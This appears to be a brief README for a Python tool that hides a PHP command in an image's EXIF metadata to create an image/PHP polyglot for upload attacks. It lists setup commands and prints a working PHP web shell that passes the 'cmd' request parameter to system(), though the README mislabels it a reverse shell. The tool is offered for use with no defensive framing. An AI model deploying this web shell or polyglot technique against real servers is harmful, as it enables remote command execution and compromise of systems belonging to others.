# Polyglot-Generator
First Polyglot Generator written in python (image file + php command)
* The PHP command is stored within the image’s EXIF metadata.

# Requierments
- Python 3
- PIL module (PIP)
- Image file
- php reverse shell command

# Set Up
Install PIL module
```$ pip install Pillow piexif```

Run the file
```$ python3 polyglotGenerator.py```

Example of the PHP reverse shell command that can used
```$ <?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; } __HALT_COMPILER();?>```


